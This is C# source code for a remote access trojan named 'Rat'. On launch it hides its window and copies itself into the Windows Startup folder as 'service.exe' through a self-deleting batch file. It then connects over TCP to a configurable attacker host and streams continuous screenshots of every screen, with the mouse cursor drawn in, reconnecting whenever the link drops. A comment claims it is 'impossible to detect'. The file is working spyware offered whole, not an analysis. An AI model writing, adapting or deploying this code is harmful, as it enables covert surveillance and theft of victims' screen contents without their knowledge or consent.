using System;
using System.ComponentModel;
using System.Drawing;
using System.Windows.Forms;
using System.IO;
using System.Threading;
using System.Net.Sockets;
using System.Runtime.Serialization.Formatters.Binary;
using System.Drawing.Imaging;
using System.Runtime.InteropServices;
using System.Linq;
namespace ProjectX
{
    class Rat : Form
    {
        private Thread t;
        private static string victimIp = "STD_IP";
        private static int victimPort = STD_PORT;
        [StructLayout(LayoutKind.Sequential)]
        private struct CURSORINFO
        {
            public Int32 cbSize;
            public Int32 flags;
            public IntPtr hCursor;
            public POINTAPI ptScreenPos;
        }
        [StructLayout(LayoutKind.Sequential)]
        private struct POINTAPI
        {
            public int x;
            public int y;
        }
        [DllImport("user32.dll")]
        private static extern bool GetCursorInfo(out CURSORINFO pci);

        [DllImport("user32.dll", SetLastError = true)]
        static extern bool DrawIconEx(IntPtr hdc, int xLeft, int yTop, IntPtr hIcon, int cxWidth, int cyHeight, int istepIfAniCur, IntPtr hbrFlickerFreeDraw, int diFlags);

        private const Int32 CURSOR_SHOWING = 0x0001;
        private const Int32 DI_NORMAL = 0x0003;
        public static bool HasStarted { get; private set; }

        public Rat()
        {

            Load += Rat_Load;
            Button b = new Button();
            b.Click += B_Click;
            this.Controls.Add(b);
            this.VisibleChanged += Rat_VisibleChanged;
        }

        private void Rat_VisibleChanged(object sender, EventArgs e)
        {
            new Thread(EnableRat).Start();
        }

        private void B_Click(object sender, EventArgs e)
        {
            Visible = false;
        }

        private void Rat_Load(object sender, EventArgs e)
        {
            try
            {
                string s = Directory.GetCurrentDirectory();
                string[] p = s.Split('\\');
                if (p[p.Length - 1].Equals("system32"))
                {
                    goto A;
                }
                string CopyOptions = "copy \"STD_NAME.exe\" \"%AppData%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\service.exe\"";
                File.WriteAllText("directive.bat", CopyOptions);
                Thread.Sleep(1000);
                System.Diagnostics.Process.Start("directive.bat");
                Thread.Sleep(3000);
                File.Delete("directive.bat");
            }
            catch (Exception WrongAccess)
            {
                goto A;
            }
        A:
            t = new Thread(SetUpOperations);
            t.Start();
        }
        private void SetUpOperations()
        {
            Invoke(new MethodInvoker(() =>
            {
                this.Visible = false;

            }));
        }
        private void InfiniteLoop()
        {
            int i = 0;
            while (true)
            {
                Thread.Sleep(1000);
                MessageBox.Show("Still running" + i.ToString());
                i++;
            }
        }
        private static void EnableRat()
        {
            Thread t;
        INIT:
            t = new Thread(RatCode);
            t.Start();
            HasStarted = true;
            while (HasStarted)
            {
                if (!t.IsAlive)
                {
                    HasStarted = false;
                }

            }
            goto INIT;

        }
        private static void RatCode()
        {
            TcpClient Client = new TcpClient();
            BinaryFormatter binF = new BinaryFormatter();
            try
            {
                Client.Connect(victimIp, victimPort);
            }
            catch (Exception e)
            {
                //MessageBox.Show(e.Message);
                Thread.Sleep(500); // it doesn't waste resources, impossible to detect
                return;
            }
            NetworkStream mainStream = Client.GetStream();
            try
            {
                while (true)
                {
                    //Thread.Sleep(300);
                    binF.Serialize(mainStream, CaptureFullScreen(true)); //should be grapdesktop
                }
            }
            catch (Exception e)
            {
                //MessageBox.Show(e.Message);
                return;
            }

        }
        private static Image GrabDesktop()
        {
            Rectangle bounds = Screen.PrimaryScreen.Bounds;
            Bitmap screenshot = new Bitmap(bounds.Width, bounds.Height, PixelFormat.Format32bppArgb);
            Graphics graphic = Graphics.FromImage(screenshot);
            graphic.CopyFromScreen(bounds.X, bounds.Y, 0, 0, bounds.Size, CopyPixelOperation.SourceCopy);
            return screenshot;
        }

        public static Bitmap CaptureFullScreen(bool captureMouse)
        {
            var allBounds = Screen.AllScreens.Select(s => s.Bounds).ToArray();
            Rectangle bounds = Rectangle.FromLTRB(allBounds.Min(b => b.Left), allBounds.Min(b => b.Top), allBounds.Max(b => b.Right), allBounds.Max(b => b.Bottom));

            var bitmap = CaptureScreen(bounds, captureMouse);
            return bitmap;
        }

        public static Bitmap CapturePrimaryScreen(bool captureMouse)
        {
            Rectangle bounds = Screen.PrimaryScreen.Bounds;

            var bitmap = CaptureScreen(bounds, captureMouse);
            return bitmap;
        }

        public static Bitmap CaptureScreen(Rectangle bounds, bool captureMouse)
        {
            Bitmap result = new Bitmap(bounds.Width, bounds.Height);

            try
            {
                using (Graphics g = Graphics.FromImage(result))
                {
                    g.CopyFromScreen(bounds.Location, Point.Empty, bounds.Size);

                    if (captureMouse)
                    {
                        CURSORINFO pci;
                        pci.cbSize = Marshal.SizeOf(typeof(CURSORINFO));

                        if (GetCursorInfo(out pci))
                        {
                            if (pci.flags == CURSOR_SHOWING)
                            {
                                var hdc = g.GetHdc();
                                DrawIconEx(hdc, pci.ptScreenPos.x - bounds.X, pci.ptScreenPos.y - bounds.Y, pci.hCursor, 0, 0, 0, IntPtr.Zero, DI_NORMAL);
                                g.ReleaseHdc();
                            }
                        }
                    }
                }
            }
            catch
            {
                result = null;
            }

            return result;
        }

        [STAThread]
        public static void Main()
        {
            Application.EnableVisualStyles();
            Application.Run(new Rat());
        }
    }
}
